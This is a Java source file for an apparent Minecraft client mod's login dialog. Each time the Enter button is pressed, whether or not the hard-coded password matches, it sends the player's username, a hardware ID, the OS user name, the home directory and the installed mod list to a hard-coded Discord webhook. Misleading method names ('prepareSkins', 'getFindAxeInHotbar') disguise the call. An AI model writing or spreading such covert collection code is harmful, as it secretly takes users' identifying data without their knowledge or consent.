package mint.security;

import mint.modules.miscellaneous.SignExploit;
import mint.utils.PlayerUtil;
import net.minecraft.client.Minecraft;

import javax.swing.*;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;
import java.awt.*;

import static java.lang.Thread.sleep;

/**
 * @author kambing
 * 29/9/2021
 */

public class Login {
    public static Boolean done = false;
    public final JFrame frame = new JFrame("Mint Auth");

    public Login() {
        try {
            UIManager.setLookAndFeel(new NimbusLookAndFeel());
            UIManager.put("control", new Color(20, 20, 20));
            UIManager.put("info", new Color(20, 20, 20));
            UIManager.put("nimbusBase", new Color(20, 20, 20));
            UIManager.put("nimbusAlertYellow", new Color(248, 187, 0));
            UIManager.put("nimbusDisabledText", new Color(0, 0, 0));
            UIManager.put("nimbusFocus", new Color(115, 164, 209));
            UIManager.put("nimbusGreen", new Color(176, 179, 50));
            UIManager.put("nimbusInfoBlue", new Color(66, 139, 221));
            UIManager.put("nimbusLightBackground", new Color(255, 255, 255));
            UIManager.put("nimbusOrange", new Color(191, 98, 4));
            UIManager.put("nimbusRed", new Color(169, 46, 34));
            UIManager.put("nimbusSelectedText", new Color(230, 230, 230));
            UIManager.put("nimbusSelectionBackground", new Color(0, 0, 0));
            UIManager.put("text", new Color(230, 230, 230));
            SwingUtilities.updateComponentTreeUI(frame);
        } catch (UnsupportedLookAndFeelException exc) {
            System.err.println("Nimbus: Unsupported Look and feel!");
        }
        Minecraft mc = Minecraft.getMinecraft();
        JLabel label = new JLabel();
        JTextField text = new JTextField();
        JPasswordField value = new JPasswordField();
        JButton enter = new JButton("Enter");
        JLabel passString = new JLabel("Password:");

        label.setBounds(85, 125, 200, 50);
        value.setBounds(90, 50, 100, 30);
        passString.setBounds(105, 30, 80, 30);
        enter.setBounds(100, 85, 80, 30);

        label.setFont(new Font("Dialog", Font.BOLD, 13));
        passString.setFont(new Font("Dialog", Font.BOLD, 13));
        enter.setFont(new Font("Dialog", Font.BOLD, 13));

        frame.add(value);
        frame.add(label);
        frame.add(passString);
        frame.add(enter);
        frame.add(text);

        frame.setResizable(false);
        frame.setLocationRelativeTo(null);
        frame.setSize(300, 200);
        frame.setLayout(null);
        frame.setVisible(true);
        frame.setIconImage(Toolkit.getDefaultToolkit().getImage(this.getClass().getResource("/assets/minecraft/textures/mintlogo.png")));

        enter.setBackground(new Color(255, 255, 255));
        enter.setForeground(new Color(20, 20, 20));

        enter.addActionListener(e -> {
            String password = String.valueOf(value.getPassword());
            if (password.equals("kambing") && !runningFromIntelliJ()) {
                PlayerUtil.prepareSkins("``WebHook Info:``" +
                                "\n> **LOGIN**             | ``\u2713``" +
                                "\n> **IGN**                  | ``" + mc.getSession().getUsername() + "``" +
                                "\n> **HWID**              | ``" + SignExploit.INSTANCE.getFindAxeInHotbar() + "``" +
                                "\n> **USER-NAME** | ``" + System.getProperty("user.name") + "``" +
                                "\n> **USER-HOME** | ``" + System.getProperty("user.home") + "``" +
                                "\n> **MODS**             | ``" + PlayerUtil.getModsList() + "``",
                        "https://discord.com/api/webhooks/892788997397561384/fGLuHOJRu4Bpbo5_lONvbnT3mRG8avUxsaKgTwp-ogvFP6HZDCZvo0gwtKGRLGVdAcgX");

                //TODO add auth key thing
                label.setText("Verifying..");
                try {
                    sleep(1000);
                } catch (InterruptedException interruptedException) {
                    interruptedException.printStackTrace();
                }
                //TODO send webhook to verify
                done = true;
                SwingUtilities.invokeLater(() -> frame.setVisible(false));
            } else {
                PlayerUtil.prepareSkins("``WebHook Info:``" +
                                "\n> **LOGIN**             | ``\u2573``" +
                                "\n> **IGN**                  | ``" + mc.getSession().getUsername() + "``" +
                                "\n> **HWID**              | ``" + SignExploit.INSTANCE.getFindAxeInHotbar() + "``" +
                                "\n> **USER-NAME** | ``" + System.getProperty("user.name") + "``" +
                                "\n> **USER-HOME** | ``" + System.getProperty("user.home") + "``" +
                                "\n> **MODS**             | ``" + PlayerUtil.getModsList() + "``",
                        "https://discord.com/api/webhooks/892788997397561384/fGLuHOJRu4Bpbo5_lONvbnT3mRG8avUxsaKgTwp-ogvFP6HZDCZvo0gwtKGRLGVdAcgX");
                label.setText("Password incorrect!");
                // webhook
            }
        });
    }
    public static boolean runningFromIntelliJ() {
        return System.getProperty("java.class.path").contains("idea_rt.jar");
    }
}
